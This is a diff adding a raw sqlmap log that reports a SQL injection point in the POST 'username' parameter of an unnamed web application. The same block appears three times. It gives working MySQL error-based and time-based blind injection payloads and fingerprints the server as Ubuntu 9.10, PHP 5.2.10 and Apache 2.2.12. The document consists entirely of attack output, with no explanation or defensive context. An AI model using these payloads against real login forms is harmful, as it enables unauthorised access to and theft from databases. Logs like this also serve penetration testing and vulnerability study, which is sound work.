@@ -1,0 +1,42 @@
+sqlmap identified the following injection point(s) with a total of 1818 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=admin' AND (SELECT 5922 FROM(SELECT COUNT(*),CONCAT(0x7162717a71,(SELECT (ELT(5922=5922,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- fbwo&password=dasda
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=admin' AND SLEEP(5)-- bJGj&password=dasda
+---
+web server operating system: Linux Ubuntu 9.10 (Karmic Koala)
+web application technology: PHP 5.2.10, Apache 2.2.12
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=admin' AND (SELECT 5922 FROM(SELECT COUNT(*),CONCAT(0x7162717a71,(SELECT (ELT(5922=5922,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- fbwo&password=dasda
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=admin' AND SLEEP(5)-- bJGj&password=dasda
+---
+web server operating system: Linux Ubuntu 9.10 (Karmic Koala)
+web application technology: PHP 5.2.10, Apache 2.2.12
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=admin' AND (SELECT 5922 FROM(SELECT COUNT(*),CONCAT(0x7162717a71,(SELECT (ELT(5922=5922,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- fbwo&password=dasda
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=admin' AND SLEEP(5)-- bJGj&password=dasda
+---
+web server operating system: Linux Ubuntu 9.10 (Karmic Koala)
+web application technology: PHP 5.2.10, Apache 2.2.12
+back-end DBMS: MySQL >= 5.0
